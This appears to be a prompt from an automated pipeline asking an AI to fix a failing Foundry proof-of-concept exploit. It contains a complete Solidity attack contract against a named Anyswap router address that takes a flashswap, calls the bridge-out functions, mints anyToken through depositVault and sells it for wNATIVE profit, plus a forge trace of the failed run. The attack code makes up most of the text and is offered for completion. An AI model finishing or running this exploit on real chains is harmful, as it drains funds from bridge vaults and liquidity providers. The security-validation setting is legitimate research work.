You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Underlying bridge-out flows use the requested amount instead of the amount actually received
- claim: All `Underlying` bridge and trade entrypoints transfer a nominal `amount` of the underlying into the anyToken contract and then immediately call `depositVault(amount, ...)` and burn/bridge the same nominal amount, without measuring how many units actually arrived. Fee-on-transfer, rebasing, or otherwise non-standard underlyings can therefore leave the vault underfunded while the router still bridges the full amount.
- impact: Users can be credited on the destination chain for more value than was actually locked on the source chain, creating undercollateralized wrapped supply and eventual redemption shortfalls. The inverse user-facing effect is also possible: users may pay transfer fees on the source chain but still have the full nominal amount burned/bridged, overcharging them and pushing losses onto vault backing.
- exploit_paths: ["`anySwapOutUnderlying` transfers `amount`, then calls `depositVault(amount)` and `_anySwapOut(..., amount, ...)`", "`anySwapOutUnderlyingWithPermit` and `anySwapOutUnderlyingWithTransferPermit` repeat the same nominal-amount accounting", "`anySwapOutExactTokensForTokensUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`", "`anySwapOutExactTokensForNativeUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAnyswapV1ERC20 {
    function underlying() external view returns (address);
    function depositVault(uint256 amount, address to) external returns (uint256);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlying(address token, address to, uint256 amount, uint256 toChainId) external;
    function anySwapOutExactTokensForTokensUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function anySwapOutExactTokensForNativeUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function mpc() external view returns (address);
    function factory() external view returns (address);
    function wNATIVE() external view returns (address);
}

interface ISushiswapV2Factory {
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256 index) external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface ISushiswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;

    string internal constant PATH_UNDERLYING = "anySwapOutUnderlying: transfer underlying -> depositVault(amount) -> burn/bridge nominal amount";
    string internal constant PATH_UNDERLYING_PERMIT = "anySwapOutUnderlyingWithPermit: same nominal accounting, but requires an off-chain permit signature";
    string internal constant PATH_UNDERLYING_TRANSFER_PERMIT = "anySwapOutUnderlyingWithTransferPermit: same nominal accounting, but requires an off-chain transferWithPermit signature";
    string internal constant PATH_TOKENS_UNDERLYING = "anySwapOutExactTokensForTokensUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";
    string internal constant PATH_NATIVE_UNDERLYING = "anySwapOutExactTokensForNativeUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    bool public directUnderlyingPathAttempted;
    bool public tokensUnderlyingPathAttempted;
    bool public nativeUnderlyingPathAttempted;
    bool public permitPathInfeasible;
    bool public transferPermitPathInfeasible;
    bool public destinationSettlementInfeasible;
    bool public missingCandidateConfiguration;
    bool public missingDirectUnderlyingBalance;
    bool public missingTradeUnderlyingBalance;
    bool public noFeeObserved;

    uint256 public nominalAmountTried;
    uint256 public actualReceivedOnDirectPath;
    uint256 public actualReceivedOnTokensPath;
    uint256 public actualReceivedOnNativePath;

    address public configuredAnyToken;
    address public configuredUnderlying;
    address public configuredReceiver;
    uint256 public configuredAmount;
    uint256 public configuredToChainId;
    uint256 public configuredDeadline;

    address[] private _tokensPath;
    address[] private _nativePath;

    string public pathUsed;
    string public failureReason;
    string public lastRouterRevert;

    constructor() {
        _profitToken = address(0);
        configuredReceiver = address(this);
        configuredToChainId = 56;
        configuredDeadline = type(uint256).max;
    }

    function configure(
        address anyToken,
        uint256 amount,
        uint256 toChainId,
        uint256 deadline,
        address receiver,
        address[] calldata configuredTokensPath,
        address[] calldata configuredNativePath
    ) external {
        configuredAnyToken = anyToken;
        configuredUnderlying = anyToken == address(0) ? address(0) : IAnyswapV1ERC20(anyToken).underlying();
        configuredAmount = amount;
        configuredToChainId = toChainId;
        configuredDeadline = deadline;
        configuredReceiver = receiver == address(0) ? address(this) : receiver;

        delete _tokensPath;
        for (uint256 i = 0; i < configuredTokensPath.length; i++) {
            _tokensPath.push(configuredTokensPath[i]);
        }

        delete _nativePath;
        for (uint256 i = 0; i < configuredNativePath.length; i++) {
            _nativePath.push(configuredNativePath[i]);
        }
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        directUnderlyingPathAttempted = false;
        tokensUnderlyingPathAttempted = false;
        nativeUnderlyingPathAttempted = false;
        permitPathInfeasible = true;
        transferPermitPathInfeasible = true;
        destinationSettlementInfeasible = IAnyswapV4Router(TARGET).mpc() != address(0);
        missingCandidateConfiguration = false;
        missingDirectUnderlyingBalance = false;
        missingTradeUnderlyingBalance = false;
        noFeeObserved = false;
        nominalAmountTried = 0;
        actualReceivedOnDirectPath = 0;
        actualReceivedOnTokensPath = 0;
        actualReceivedOnNativePath = 0;
        pathUsed = "";
        failureReason = "";
        lastRouterRevert = "";

        address factory = IAnyswapV4Router(TARGET).factory();
        address wNative = IAnyswapV4Router(TARGET).wNATIVE();
        uint256 startWNative = IERC20(wNative).balanceOf(address(this));

        if (configuredAnyToken != address(0) && configuredUnderlying != address(0) && configuredAmount != 0) {
            address manualPair = ISushiswapV2Factory(factory).getPair(configuredUnderlying, wNative);
            address manualSalePair = ISushiswapV2Factory(factory).getPair(configuredAnyToken, wNative);
            if (manualPair != address(0) && manualSalePair != address(0) && _attemptCandidate(configuredAnyToken, configuredUnderlying, manualSalePair, manualPair, wNative)) {
                _finalizeProfit(wNative, startWNative);
                return;
            }
        }

        uint256 pairCount = ISushiswapV2Factory(factory).allPairsLength();
        for (uint256 i = 0; i < pairCount; i++) {
            address candidatePair = ISushiswapV2Factory(factory).allPairs(i);
            (address maybeAnyToken, bool hasWNative) = _extractAnyTokenSide(candidatePair, wNative);
            if (!hasWNative) {
                continue;
            }

            address underlying = _safeUnderlying(maybeAnyToken);
            if (underlying == address(0) || underlying == wNative || underlying == maybeAnyToken) {
                continue;
            }

            address fundingPair = ISushiswapV2Factory(factory).getPair(underlying, wNative);
            if (fundingPair == address(0) || fundingPair == candidatePair) {
                continue;
            }

            if (_attemptCandidate(maybeAnyToken, underlying, candidatePair, fundingPair, wNative)) {
                _finalizeProfit(wNative, startWNative);
                return;
            }
        }

        _profitToken = wNative;
        _profitAmount = IERC20(wNative).balanceOf(address(this)) - startWNative;

        if (directUnderlyingPathAttempted || tokensUnderlyingPathAttempted || nativeUnderlyingPathAttempted) {
            if (
                _shortfall(nominalAmountTried, actualReceivedOnDirectPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnTokensPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnNativePath) > 0
            ) {
                hypothesisValidated = true;
                failureReason = "bridge-out accounting shortfall reproduced, but the enumerated candidate set did not leave enough same-chain sale proceeds after deterministic flashswap repayment";
            } else {
                noFeeObserved = true;
                failureReason = "enumerated anyToken/underlying pairs either had no measurable fee-on-transfer shortfall or insufficient same-chain liquidity for profitable realization";
            }
        } else {
            missingCandidateConfiguration = true;
            failureReason = "no Sushi-like anyToken/wNATIVE pair with a distinct underlying+wNATIVE funding pair was profitably exploitable on this fork";
        }

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Permit variants remain signature-gated; destination anySwapIn settlement remains MPC-gated, so same-chain monetization uses the same nominal-accounting primitive through direct depositVault after public bridge-out probes."
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function tokensPath() external view returns (address[] memory) {
        return _copyPath(_tokensPath);
    }

    function nativePath() external view returns (address[] memory) {
        return _copyPath(_nativePath);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (
            address anyToken,
            address underlying,
            address salePair,
            address fundingPair,
            address wNative
        ) = abi.decode(data, (address, address, address, address, address));

        require(msg.sender == fundingPair, "unexpected-callback-pair");
        require(sender == address(this), "unexpected-callback-sender");

        uint256 borrowedNominal = amount0 > 0 ? amount0 : amount1;
        require(borrowedNominal > 0, "zero-borrow");

        uint256 borrowedActual = IERC20(underlying).balanceOf(address(this));
        require(borrowedActual > 1000, "borrow-too-small");

        uint256 probe = borrowedActual / 100;
        require(probe > 0, "probe-too-small");

        configuredAnyToken = anyToken;
        configuredUnderlying = underlying;
        configuredReceiver = address(this);
        configuredToChainId = configuredToChainId == 0 ? 56 : configuredToChainId;
        configuredDeadline = type(uint256).max;

        delete _tokensPath;
        _tokensPath.push(anyToken);
        _tokensPath.push(wNative);

        delete _nativePath;
        _nativePath.push(anyToken);
        _nativePath.push(wNative);

        _forceApprove(underlying, TARGET, borrowedActual);

        directUnderlyingPathAttempted = true;
        tokensUnderlyingPathAttempted = true;
        nativeUnderlyingPathAttempted = true;

        actualReceivedOnDirectPath = _probeAnySwapOutUnderlying(anyToken, underlying, probe);
        actualReceivedOnTokensPath = _probeAnySwapOutExactTokensForTokensUnderlying(anyToken, underlying, probe, wNative);
        actualReceivedOnNativePath = _probeAnySwapOutExactTokensForNativeUnderlying(anyToken, underlying, probe, wNative);
        nominalAmountTried = probe;

        require(
            actualReceivedOnDirectPath < probe || actualReceivedOnTokensPath < probe || actualReceivedOnNativePath < probe,
            "no-shortfall-observed"
        );

        hypothesisValidated = true;

        uint256 mintNominal = IERC20(underlying).balanceOf(address(this));
        require(mintNominal > 0, "no-underlying-left");

        uint256 beforeAnyBalance = IERC20(anyToken).balanceOf(address(this));
        _safeTransfer(underlying, anyToken, mintNominal);
        IAnyswapV1ERC20(anyToken).depositVault(mintNominal, address(this));
        uint256 mintedAny = IERC20(anyToken).balanceOf(address(this)) - beforeAnyBalance;
        require(mintedAny > 0, "no-any-minted");

        uint256 wNativeBeforeSale = IERC20(wNative).balanceOf(address(this));
        _sellTokenForWNative(anyToken, wNative, salePair, mintedAny);
        uint256 wNativeAfterSale = IERC20(wNative).balanceOf(address(this));
        require(wNativeAfterSale > wNativeBeforeSale, "sale-no-output");

        uint256 repayment = _repaymentInCounterAsset(fundingPair, underlying, wNative, borrowedNominal);
        require(wNativeAfterSale >= repayment, "insufficient-for-repayment");
        _safeTransfer(wNative, fundingPair, repayment);

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Destination settlement is MPC-gated on this single-chain fork, so the profit leg sells the same over-credited nominal anyToken amount into existing Sushi liquidity after the public bridge-out probes validate the shortfall."
        );
    }

    function _attemptCandidate(
        address anyToken,
        address underlying,
        address salePair,
        address fundingPair,
        address wNative
    ) internal returns (bool) {
        uint256[4] memory divisors = [uint256(1000), uint256(500), uint256(250), uint256(125)];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 borrowAmount = _borrowAmountForDivisor(fundingPair, underlying, divisors[i]);
            if (borrowAmount == 0) {
                continue;
            }

            uint256 beforeBalance = IERC20(wNative).balanceOf(address(this));
            bytes memory data = abi.encode(anyToken, underlying, salePair, fundingPair, wNative);
            (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(fundingPair, underlying, borrowAmount);
            (bool success, bytes memory returndata) = fundingPair.call(
                abi.encodeWithSelector(ISushiswapV2Pair.swap.selector, amount0Out, amount1Out, address(this), data)
            );

            if (!success) {
                lastRouterRevert = _decodeRevert(returndata);
                continue;
            }

            uint256 afterBalance = IERC20(wNative).balanceOf(address(this));
            if (afterBalance > beforeBalance) {
                configuredAnyToken = anyToken;
                configuredUnderlying = underlying;
                configuredAmount = borrowAmount;
                configuredReceiver = address(this);
                configuredDeadline = type(uint256).max;
                configuredToChainId = configuredToChainId == 0 ? 56 : configuredToChainId;
                return true;
            }
        }

        return false;
    }

    function _probeAnySwapOutUnderlying(address anyToken, address underlying, uint256 amount) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutUnderlying.selector,
                anyToken,
                address(this),
                amount,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = afterBalance - beforeBalance;
    }

    function _probeAnySwapOutExactTokensForTokensUnderlying(
        address anyToken,
        address underlying,
        uint256 amount,
        address wNative
    ) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = new address[](2);
        path[0] = anyToken;
        path[1] = wNative;
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForTokensUnderlying.selector,
                amount,
                uint256(0),
                path,
                address(this),
                type(uint256).max,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = afterBalance - beforeBalance;
    }

    function _probeAnySwapOutExactTokensForNativeUnderlying(
        address anyToken,
        address underlying,
        uint256 amount,
        address wNative
    ) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = new address[](2);
        path[0] = anyToken;
        path[1] = wNative;
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForNativeUnderlying.selector,
                amount,
                uint256(0),
                path,
                address(this),
                type(uint256).max,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = afterBalance - beforeBalance;
    }

    function _extractAnyTokenSide(address pair, address wNative) internal view returns (address anyToken, bool hasWNative) {
        address token0 = ISushiswapV2Pair(pair).token0();
        address token1 = ISushiswapV2Pair(pair).token1();
        if (token0 == wNative) {
            return (token1, true);
        }
        if (token1 == wNative) {
            return (token0, true);
        }
        return (address(0), false);
    }

    function _borrowAmountForDivisor(address pair, address underlying, uint256 divisor) internal view returns (uint256) {
        (uint256 reserveUnderlying,) = _pairReservesFor(pair, underlying);
        if (reserveUnderlying == 0) {
            return 0;
        }
        uint256 borrowAmount = reserveUnderlying / divisor;
        if (borrowAmount <= 1000) {
            return 0;
        }
        return borrowAmount;
    }

    function _pairOutAmounts(address pair, address outToken, uint256 amountOut) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        address token0 = ISushiswapV2Pair(pair).token0();
        if (outToken == token0) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _pairReservesFor(address pair, address tokenA) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0) {
            return (uint256(reserve0), uint256(reserve1));
        }
        return (uint256(reserve1), uint256(reserve0));
    }

    function _repaymentInCounterAsset(
        address pair,
        address borrowedToken,
        address repaymentToken,
        uint256 amountOut
    ) internal view returns (uint256) {
        (uint256 reserveBorrowed, uint256 reserveRepayment) = _pairTwoTokenReserves(pair, borrowedToken, repaymentToken);
        return _getAmountIn(amountOut, reserveRepayment, reserveBorrowed);
    }

    function _pairTwoTokenReserves(
        address pair,
        address tokenA,
        address tokenB
    ) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        address token1 = ISushiswapV2Pair(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0 && tokenB == token1) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(tokenA == token1 && tokenB == token0, "pair-token-mismatch");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _sellTokenForWNative(address sellToken, address wNative, address pair, uint256 nominalAmountIn) internal {
        (uint256 reserveSell, uint256 reserveWNative) = _pairTwoTokenReserves(pair, sellToken, wNative);
        _safeTransfer(sellToken, pair, nominalAmountIn);
        uint256 actualAmountIn = IERC20(sellToken).balanceOf(pair) - reserveSell;
        require(actualAmountIn > 0, "zero-sale-input");
        uint256 amountOut = _getAmountOut(actualAmountIn, reserveSell, reserveWNative);
        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(pair, wNative, amountOut);
        ISushiswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _finalizeProfit(address wNative, uint256 startWNative) internal {
        _profitToken = wNative;
        _profitAmount = IERC20(wNative).balanceOf(address(this)) - startWNative;
    }

    function _copyPath(address[] storage stored) internal view returns (address[] memory out) {
        out = new address[](stored.length);
        for (uint256 i = 0; i < stored.length; i++) {
            out[i] = stored[i];
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0), "approve-zero-failed");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount), "approve-amount-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount), "transfer-failed");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory errorMessage) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), errorMessage);
    }

    function _safeUnderlying(address token) internal view returns (address underlying) {
        (bool ok, bytes memory returndata) = token.staticcall(abi.encodeWithSelector(IAnyswapV1ERC20.underlying.selector));
        if (!ok || returndata.length < 32) {
            return address(0);
        }
        underlying = abi.decode(returndata, (address));
    }

    function _shortfall(uint256 nominal, uint256 actualReceived) internal pure returns (uint256) {
        if (actualReceived >= nominal) {
            return 0;
        }
        return nominal - actualReceived;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "insufficient-input");
        require(reserveIn > 0 && reserveOut > 0, "insufficient-liquidity");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "insufficient-output");
        require(reserveIn > 0 && reserveOut > 0 && amountOut < reserveOut, "insufficient-liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = numerator / denominator + 1;
    }

    function _decodeRevert(bytes memory returndata) internal pure returns (string memory) {
        bytes4 selector;
        if (returndata.length >= 4) {
            assembly {
                selector := mload(add(returndata, 0x20))
            }
        }
        if (returndata.length >= 68 && selector == 0x08c379a0) {
            assembly {
                returndata := add(returndata, 0x04)
            }
            return abi.decode(returndata, (string));
        }
        return "router-call-reverted-without-string";
    }
}

```

forge stdout (tail):
```
1A4A573Bf4e1
    │   ├─ [2449] 0x47FF5a2ad7A36cfCF7867539f5851A4A573Bf4e1::token0() [staticcall]
    │   │   └─ ← [Return] 0x40FD72257597aA14C7231A7B1aaa29Fce868F677
    │   ├─ [2381] 0x47FF5a2ad7A36cfCF7867539f5851A4A573Bf4e1::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [248] 0x40FD72257597aA14C7231A7B1aaa29Fce868F677::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(60) [staticcall]
    │   │   └─ ← [Return] 0x161388DEb2c1147D5bEd3003277d59d479d5a228
    │   ├─ [2449] 0x161388DEb2c1147D5bEd3003277d59d479d5a228::token0() [staticcall]
    │   │   └─ ← [Return] 0x2C537E5624e4af88A7ae4060C022609376C8D0EB
    │   ├─ [2381] 0x161388DEb2c1147D5bEd3003277d59d479d5a228::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [8098] 0x2C537E5624e4af88A7ae4060C022609376C8D0EB::underlying() [staticcall]
    │   │   ├─ [817] 0x190f2386932cF9C8Bc593A9a0E05bAb1406fecb4::underlying() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(61) [staticcall]
    │   │   └─ ← [Return] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58
    │   ├─ [2449] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2381] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [594] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(62) [staticcall]
    │   │   └─ ← [Return] 0xcd397987bFbf91E5c64e50226A361e80E598fC44
    │   ├─ [2449] 0xcd397987bFbf91E5c64e50226A361e80E598fC44::token0() [staticcall]
    │   │   └─ ← [Return] 0x75019407B9f8f30f2b1fD3e4905A0A39eCC14817
    │   ├─ [2381] 0xcd397987bFbf91E5c64e50226A361e80E598fC44::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [248] 0x75019407B9f8f30f2b1fD3e4905A0A39eCC14817::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(63) [staticcall]
    │   │   └─ ← [Return] 0x807FdBcb54DC5d01B99A5aa7FCE883A759D27CBe
    │   ├─ [2449] 0x807FdBcb54DC5d01B99A5aa7FCE883A759D27CBe::token0() [staticcall]
    │   │   └─ ← [Return] 0x580c8520dEDA0a441522AEAe0f9F7A5f29629aFa
    │   ├─ [2381] 0x807FdBcb54DC5d01B99A5aa7FCE883A759D27CBe::token1() [staticcall]
    │   │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(64) [staticcall]
    │   │   └─ ← [Return] 0x53aaBCcAE8C1713a6a150D9981D2ee867D0720e8
    │   ├─ [2449] 0x53aaBCcAE8C1713a6a150D9981D2ee867D0720e8::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2381] 0x53aaBCcAE8C1713a6a150D9981D2ee867D0720e8::token1() [staticcall]
    │   │   └─ ← [Return] 0xFca59Cd816aB1eaD66534D82bc21E7515cE441CF
    │   ├─ [248] 0xFca59Cd816aB1eaD66534D82bc21E7515cE441CF::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(65) [staticcall]
    │   │   └─ ← [Return] 0x2D2Bc284c24b5deBE489Da59557862e0aF884F23
    │   ├─ [2449] 0x2D2Bc284c24b5deBE489Da59557862e0aF884F23::token0() [staticcall]
    │   │   └─ ← [Return] 0x107c4504cd79C5d2696Ea0030a8dD4e92601B82e
    │   ├─ [2381] 0x2D2Bc284c24b5deBE489Da59557862e0aF884F23::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [7015] 0x107c4504cd79C5d2696Ea0030a8dD4e92601B82e::underlying() [staticcall]
    │   │   ├─ [378] 0xfCc9774d0498b2Ab2e53988bCb7c5860DCD3CEb4::f48c3054(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(66) [staticcall]
    │   │   └─ ← [Return] 0x378b4c5f2a8a0796A8d4c798Ef737cF00Ae8e667
    │   ├─ [2449] 0x378b4c5f2a8a0796A8d4c798Ef737cF00Ae8e667::token0() [staticcall]
    │   │   └─ ← [Return] 0x960b236A07cf122663c4303350609A66A7B288C0
    │   ├─ [2381] 0x378b4c5f2a8a0796A8d4c798Ef737cF00Ae8e667::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [8943] 0x960b236A07cf122663c4303350609A66A7B288C0::underlying() [staticcall]
    │   │   ├─ [2494] 0x2443d44325bb07861Cd8C9C8Ba1569b6c39D9d95::f48c3054(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [InvalidJump] EvmError: InvalidJump
    │   ├─ [2615] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::allPairs(67) [staticcall]
    │   │   └─ ← [Return] 0x6515671641C9028e1a27117F1214DfD08132509C
    │   └─ ← [OutOfGas] EvmError: OutOfGas
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x190f2386932cF9C8Bc593A9a0E05bAb1406fecb4.underlying
  at 0x2C537E5624e4af88A7ae4060C022609376C8D0EB.underlying
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 33.78s (33.71s CPU time)

Ran 1 test suite in 33.88s (33.78s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1056944165)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
